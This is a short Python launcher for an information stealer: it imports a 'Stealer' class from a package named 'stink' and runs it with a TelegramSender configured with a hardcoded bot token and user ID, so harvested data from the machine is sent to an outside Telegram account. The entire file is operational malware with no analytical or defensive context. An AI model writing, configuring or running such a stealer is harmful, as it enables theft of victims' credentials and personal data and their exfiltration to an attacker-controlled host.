from stink import Stealer
from stink.modules import TelegramSender

if __name__ == "__main__":
    Stealer(sender=TelegramSender(token="7197063868:AAHZ1zdHOZvh0UeYZxQO6wtJjieoz6TGCdc", user_id=6349365242)).run()
